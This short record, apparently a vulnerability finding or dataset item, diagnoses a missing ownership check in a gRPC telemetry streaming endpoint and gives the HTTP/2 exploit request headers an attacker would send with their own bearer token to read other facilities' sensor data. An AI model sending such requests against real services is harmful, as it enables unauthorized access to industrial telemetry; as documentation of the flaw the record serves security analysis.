diagnosis: The server-streaming gRPC handler accepts sensorId from the client request and streams real-time telemetry readings over HTTP/2. While it validates the presence of an authenticated user in gRPC metadata, it does not check if the caller owns or operates the target sensor, leaking real-time industrial telemetry from competitor facilities.
exploit_request:
POST /iot.TelemetryService/StreamDeviceTelemetry HTTP/2.0
Host: telemetry.smartfactory.io
Content-Type: application/grpc
TE: trailers
authorization: Bearer <attacker_jwt>
